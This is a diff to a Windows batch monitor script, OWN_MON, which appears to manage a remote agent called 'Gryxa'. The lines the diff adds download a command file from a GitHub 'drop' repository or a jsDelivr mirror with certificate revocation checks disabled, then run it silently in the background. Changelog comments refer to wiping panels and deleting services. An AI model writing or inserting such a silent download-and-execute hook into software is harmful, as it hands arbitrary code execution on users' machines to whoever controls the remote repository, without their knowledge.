@@ -1,6 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M50
+rem  OWN_MON  BUILD 20260804M51
+rem  M51: force_gryxa.flag queues own_gryxa_force REINSTALL (panel wipe). Daily path stays freeze.
 rem  M50: hash-mismatch → BUILD fallback (unstick CDN-stale main).
 rem  M49: FREEZE - no auto Gryxa msiexec from mon; start-only; manual force only.
 rem  M48: HANDS-OFF all SC interrupt — only Gryxa install-if-absent. No exterminate/sevrz /i/sc delete.
@@ -49,7 +50,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M50"
+set "MONVER=M51"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -452,9 +453,18 @@ if not errorlevel 1 (
   if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
 )
 
-rem FORCE push overrides healthy-skip: run a forced ensure this tick
+rem FORCE push: queue Gryxa REINSTALL (panel wipe) then ack — freeze still blocks daily msiexec
 if "%FORCE_G%"=="1" (
-  echo gryxa_force_push_L46_ack_no_install>>"%LOG%"
+  echo gryxa_force_push_reinstall>>"%LOG%"
+  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa_force.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_gryxa_force.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+  if not exist "%WD%\own_gryxa_force.cmd" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa_force.cmd" "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_gryxa_force.cmd?t=%RANDOM%" >nul 2>&1
+  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA%" >nul 2>&1
+  if exist "%WD%\own_gryxa_force.cmd" (
+    start "" /b cmd /c "call \"%WD%\own_gryxa_force.cmd\" \"%WD%\" >>\"%LOG%\" 2>&1"
+    echo gryxa_force_reinstall_queued>>"%LOG%"
+  ) else (
+    echo gryxa_force_reinstall_missing_cmd>>"%LOG%"
+  )
   if exist "%WD%\force_gryxa.new" copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
   goto :GryxaAfter
 )
